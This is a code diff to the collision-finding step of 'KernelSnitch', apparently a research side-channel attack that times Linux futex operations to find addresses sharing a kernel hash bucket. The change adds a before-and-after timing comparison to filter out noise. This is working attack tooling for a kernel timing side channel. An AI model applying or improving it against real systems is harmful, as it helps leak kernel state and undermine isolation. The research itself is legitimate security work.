@@ -328,34 +328,46 @@ void kernelsnitch_find_collisions(struct kernelsnitch_shared_state *ks)
         if (t < approx_time) approx_time = t;
     }
 
-    // piled-up hash bucket ID 128
+    /* two-phase measurement: only accept addresses whose wake time grows
+     * significantly once OUR bucket is piled - this isolates true same-bucket
+     * colliders from system-noise/contended-bucket false positives */
+    ks->futex_addrs[0] = (size_t)&ks->inc_futex[ID];
+    if (ks->verbose) pr_info("target    %016zx\n", ks->futex_addrs[0]);
+
+    /* phase 1: pre-pile wake times */
+    size_t total = ks->total_futexes;
+    size_t *t_before = calloc(total, sizeof(size_t));
+    for (size_t i = 2; i < total; ++i) {
+        id = (i * KS_PAGE_SIZE) | (i * 8 % KS_PAGE_SIZE);
+        if (id >= FUTEX_SZ)
+            break;
+        t_before[i] = __measure((size_t)&ks->futexes[id]);
+    }
+
+    /* pile the bucket */
     __increase(ks, ID, APPENDED_FUTEXES);
     if (ks->verbose) pr_info("start finding collisisons\n");
 
-    // find futex user space address which collide with the piled-up hash bucket ID 128
-    ks->futex_addrs[0] = (size_t)&ks->inc_futex[ID];
-    if (ks->verbose) pr_info("target    %016zx\n", ks->futex_addrs[0]);
     size_t threshold = approx_time * KERNELSNITCH_THRESHOLD_MULT;
     if (ks->verbose) pr_info("collision threshold approx=%zu thr=%zu\n",
                              approx_time, threshold);
-    for (size_t i = 2; i < ks->total_futexes && count < wanted; ++i) {
+    /* phase 2: post-pile; require both slow AND grown vs pre-pile */
+    for (size_t i = 2; i < total && count < wanted; ++i) {
         id = (i * KS_PAGE_SIZE) | (i * 8 % KS_PAGE_SIZE);
         if (id >= FUTEX_SZ)
             break;
         futex_addr = (size_t)&ks->futexes[id];
         ks->times[i] = __measure(futex_addr);
-        if (ks->times[i] > threshold) {
-            /* require a second independent measurement to reject noise */
-            size_t t2 = __measure(futex_addr);
-            if (t2 < threshold) {
-                continue;
-            }
+        if (ks->times[i] > threshold &&
+            ks->times[i] > t_before[i] * 3) {
             count++;
             ks->futex_addrs[count] = futex_addr;
-            if (ks->verbose) pr_info("  %016zx (t1=%zu t2=%zu)\n",
-                                     futex_addr, (size_t)ks->times[i], t2);
+            if (ks->verbose) pr_info("  %016zx (before=%zu after=%zu)\n",
+                                     futex_addr, t_before[i],
+                                     (size_t)ks->times[i]);
         }
     }
+    free(t_before);
     if (wanted == count) {
         if (ks->verbose) pr_info("found %zd collisisons\n", count);
         ks->state = KERNELSNITCH_COLLISIONS_FOUND;
